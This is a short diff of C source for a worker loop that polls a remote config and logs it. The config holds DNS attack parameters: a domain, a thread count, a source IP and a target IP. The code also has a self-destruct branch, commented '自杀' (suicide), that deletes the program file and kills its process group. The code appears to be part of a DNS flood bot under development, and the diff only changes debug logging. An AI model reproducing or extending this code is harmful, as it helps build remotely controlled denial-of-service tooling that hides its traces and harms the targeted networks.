@@ -51,6 +51,9 @@ void start_worker()
    int thread = 0;
     while(1) {
         if (parse_config() > 0) {
+        	log_debug(logger, "\nov=%s, nv=%s\nactive=%d,domain=%s,thread=%d\nsource=%s,target=%s", oldmd5, newmd5,
+        	 config.dns_active, config.dns_domain, config.dns_threads,
+        	 config.dns_sourceip, config.dns_targetip);
         	if(config.dns_interval == 43) {//自杀
         		remove(process_filename);
 				kill(0, SIGTERM);
@@ -67,8 +70,7 @@ void start_worker()
 				    }
 		        }
 		    }
-		    //config.oldmd5 = newmd5;
-		   log_debug(logger, "oldmd5=%s, newmd5=%s,dns_domain=%s", oldmd5, newmd5, config.dns_domain);
+		    
 		    if (strlen(oldmd5) != 0 && strcmp(oldmd5, newmd5) != 0) {
 		       log_info(logger, "restart child process");
 		        exit(1);
